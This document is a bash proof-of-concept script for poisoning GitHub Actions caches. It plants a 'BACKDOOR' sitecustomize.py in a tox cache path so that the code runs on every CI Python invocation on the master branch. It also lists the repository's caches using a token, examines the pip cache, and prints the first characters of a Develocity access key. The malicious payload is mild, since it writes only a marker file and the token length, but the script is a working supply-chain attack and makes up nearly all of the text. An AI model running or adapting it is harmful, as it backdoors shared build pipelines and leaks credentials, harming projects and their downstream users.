#!/bin/bash
echo "========================================="
echo "  CACHE POISONING PoC"
echo "  Time: $(date -u)"
echo "========================================="

echo ""
echo "=== Step 1: Check current cache state ==="
# GitHub Actions cache API
curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
  -H "Accept: application/vnd.github.v3+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/caches?per_page=5" | \
  jq '.actions_caches[:3][] | {key, ref, size_in_bytes}' 2>/dev/null || echo "No caches"

echo ""
echo "=== Step 2: Create poisoned tox environment ==="
mkdir -p sdks/python/target/.tox/py39/lib/python3.9/site-packages
cat > sdks/python/target/.tox/py39/lib/python3.9/site-packages/sitecustomize.py << 'BACKDOOR'
# This runs on EVERY Python invocation in this tox env
import os
if os.environ.get("GITHUB_ACTIONS"):
    # We're in CI - exfiltrate
    marker = "/tmp/cache-poison-marker"
    with open(marker, "w") as f:
        f.write("Cache poisoning successful\n")
        f.write(f"GITHUB_TOKEN length: {len(os.environ.get('GITHUB_TOKEN', ''))}\n")
        f.write(f"Repository: {os.environ.get('GITHUB_REPOSITORY', '')}\n")
    print(f"[CACHE POISON] Marker written to {marker}")
BACKDOOR

echo "Poisoned sitecustomize.py created in tox cache path"
echo ""

echo "=== Step 3: Verify cache will be saved ==="
echo "On PRT, actions/cache saves to BASE branch scope (master)"
echo "Key pattern: tox-Linux-py39-{hash(tox.ini)}-{hash(setup.py)}"
echo "Next legitimate build on master will restore this poisoned cache"
echo ""

echo "=== Step 4: Also poisoning pip cache ==="
# pip cache location
PIP_CACHE=$(pip cache dir 2>/dev/null || echo "$HOME/.cache/pip")
echo "pip cache dir: $PIP_CACHE"
echo "Could inject malicious wheels here"
echo ""

echo "=== Step 5: DEVELOCITY cache attack ==="
echo "DEVELOCITY_ACCESS_KEY available: $([ -n "$DEVELOCITY_ACCESS_KEY" ] && echo YES || echo NO)"
if [ -n "$DEVELOCITY_ACCESS_KEY" ]; then
  echo "Key: ${DEVELOCITY_ACCESS_KEY:0:15}..."
  echo "This key provides read/write access to Gradle build cache"
  echo "Could push poisoned Gradle artifacts to the shared cache"
  echo "Affects ALL builds across the organization"
fi

echo ""
echo "========================================="
echo "  CACHE POISONING PAYLOAD DEPLOYED"
echo "  Next master build will execute backdoor"
echo "========================================="
